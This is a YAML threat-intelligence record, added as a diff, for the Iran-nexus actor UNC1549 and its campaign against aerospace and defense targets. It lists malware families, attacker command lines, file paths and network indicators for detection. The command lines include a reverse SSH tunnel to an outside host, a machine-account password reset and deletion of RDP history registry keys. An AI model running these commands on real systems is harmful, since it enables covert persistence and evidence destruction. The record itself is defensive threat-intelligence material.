@@ -1,0 +1,168 @@
+description: "UNC1549 leveraged phishing, third\u2011party access, DLL search order\
+  \ hijacking and custom backdoors to maintain persistence and exfiltrate data from\
+  \ aerospace and defense targets."
+attribution: "Iran\u2011nexus threat actor UNC1549"
+malware_families:
+- MINIBIKE
+- TWOSTROKE
+- DEEPROOT
+- GHOSTLINE
+- POLLBLEND
+- LIGHTRAIL
+- DCSYNCER.SLICK
+- CRASHPAD
+- SIGHTGRAB
+- TRUSTTRAP
+TTPs:
+  processes:
+  - MINIBIKE
+  - TWOSTROKE
+  - DEEPROOT
+  - GHOSTLINE
+  - POLLBLEND
+  - LIGHTRAIL
+  - DCSYNCER.SLICK
+  - CRASHPAD
+  - SIGHTGRAB
+  - TRUSTTRAP
+  - ssh.exe
+  - SCCM.exe
+  - net.exe
+  - netdom
+  - explorer.exe
+  - reg
+  commandline:
+  - '''C:\windows\system32\openssh\ssh.exe'' [Username]@[IP Address] -p 443 -o ServerAliveInterval=60
+    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 1070'
+  - '''net user DC-01$ P@ssw0rd'''
+  - '''SCCM.exe'' reconfig /target:[REDACTED]'
+  - C:\\windows\\system32\\openssh\\ssh.exe[Username]@[IP Address] -p 443 -o ServerAliveInterval=60
+    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 1070
+  - reg delete "HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default"
+    /va /f
+  - reg delete "HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers"
+    /f
+  - net.exe Invoke-Kerberoast net user DC-01$ P@ssw0rd
+  - netdom net user <computer_name> <password>
+  powershell: []
+  scripting_engine: []
+  registry_keys:
+  - HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default
+  - HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers
+  image_load: []
+  network_connections:
+  - process: ssh.exe
+    destination: '[IP Address]'
+    port: 443
+  file_activity:
+  - C:\\Users\\Public\\Videos\\2025-3-7-10-17\\1.jpg
+  - C:\\Users\\Public\\Videos\\2025-3-7-10-17\\2.jpg
+  - C:\\Users\\Public\\Videos\\2025-3-7-10-17\\3.jpg
+  - C:\\Users\\Public\\Music\\2025-3-7-10-17\\1.jpg
+  - C:\\Users\\Public\\Music\\2025-3-7-10-17\\2.jpg
+  - C:\\Users\\Public\\Music\\2025-3-7-10-17\\3.jpg
+  - C:\\windows\\system32\\openssh\\ssh.exe
+  - C:\\users\\public\\LOG.txt
+  - C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\LOG.txt
+  - C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\crash.log
+  - C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\config.txt
+  persistence:
+  - DLL search order hijacking
+  - reverse SSH tunnels
+  - Deletion of utilities after execution
+  - Deletion of RDP connection history registry keys
+  - Use of SSH reverse tunnels for covert communication
+  process_relations: []
+IOCs:
+  hashes: []
+  ips:
+  - 104.194.215.88
+  - 13.60.50.172
+  - 167.172.137.208
+  - 34.18.42.26
+  - 4.188.75.206
+  - 4.240.113.27
+  - 40.119.176.233
+  - 46.31.115.92
+  domains:
+  - politicalanorak.com
+  - ac-connection-status105.azurewebsites.net
+  - acc-cloud-connection.azurewebsites.net
+  - active-az-check-status45.azurewebsites.net
+  - active-az-check-status675.azurewebsites.net
+  - active-az-status45.azurewebsites.net
+  - active-az-status795.azurewebsites.net
+  - active-internal-log65.azurewebsites.net
+  - active-internal-logs.azurewebsites.net
+  - active-intranet-logs.azurewebsites.net
+  - airbus.usa-careers.com
+  - airlinecontrolsite.uaenorth.cloudapp.azure.com
+  - airlinecontrolsite.westus3.cloudapp.azure.com
+  - airplaneserviceticketings.com
+  - airseatregister.eastus.cloudapp.azure.com
+  - airseatsregister.qatarcentral.cloudapp.azure.com
+  - airseatsregistering.qatarcentral.cloudapp.azure.com
+  - airtravellog.com
+  - automationagencybusiness.azurewebsites.net
+  - automationagencybusiness.com
+  - browsercheckap.azurewebsites.net
+  - codesparkle.eastus.cloudapp.azure.com
+  - connect-acc-492.azurewebsites.net
+  - customerlistchange.eastus.cloudapp.azure.com
+  - developercodepro.azurewebsites.net
+  - developercodevista.azurewebsites.net
+  - dreamtiniventures.azurewebsites.net
+  - fdtsprobusinesssolutions.azurewebsites.net
+  - fdtsprobusinesssolutions.com
+  - fdtsprobusinesssolutions.eastus.cloudapp.azure.com
+  - fdtsprobusinesssolutions.northeurope.cloudapp.azure.com
+  - forcecodestore.com
+  - hserbhh43.westus3.cloudapp.azure.com
+  - infrasync-ac372.azurewebsites.net
+  - intra-az-check-status45.azurewebsites.net
+  - intra-az-check-status675.azurewebsites.net
+  - intra-az-status45.azurewebsites.net
+  - intra-az-status795.azurewebsites.net
+  - masterflexiblecloud.azurewebsites.net
+  - mso-internal-log65.azurewebsites.net
+  - mso-internal-logs.azurewebsites.net
+  - mso-intranet-logs.azurewebsites.net
+  - mydocs.qatarcentral.cloudapp.azure.com
+  - nx425-win4945.azurewebsites.net
+  - nx4542-win4957.azurewebsites.net
+  - nxlog-crash-1567.azurewebsites.net
+  - nxlog-win-1567.azurewebsites.net
+  - nxversion-win-1567.azurewebsites.net
+  - nxversion-win32-1127.azurewebsites.net
+  - overqatfa.northeurope.cloudapp.azure.com
+  - queuetestapplication.azurewebsites.net
+  - skychain13424.azurewebsites.net
+  - skychain41334.northeurope.cloudapp.azure.com
+  - skychains42745.eastus.cloudapp.azure.com
+  - skyticketgrant.azurewebsites.net
+  - snare-core.azurewebsites.net
+  - storageboxcloud.northeurope.cloudapp.azure.com
+  - storagewiz.co.azurewebsites.net
+  - swiftcode.eastus.cloudapp.azure.com
+  - tiniventures.azurewebsites.net
+  - terratechworld.eastus.cloudapp.azure.com
+  - thecloudappbox.azurewebsites.net
+  - thestorageboxcloud.northeurope.cloudapp.azure.com
+  - thetacticstore.com
+  - thevaultapp.westus3.cloudapp.azure.com
+  - thevaultspace.eastus.cloudapp.azure.com
+  - tini-ventures.com
+  - vcphone-ms.azurewebsites.net
+  - vcs-news.com
+  - vm-ticket-svc.azurewebsites.net
+  - vm-tools-svc.azurewebsites.net
+  - vmware-health-ms.azurewebsites.net
+  urls: []
+authors:
+- Mohamed El-Banna
+- Daniel Lee
+- Mike Stokkel
+- Josh Goddard
+reference: https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense
+date_of_publication: November 17, 2025
+file_creation_date: November 17, 2025
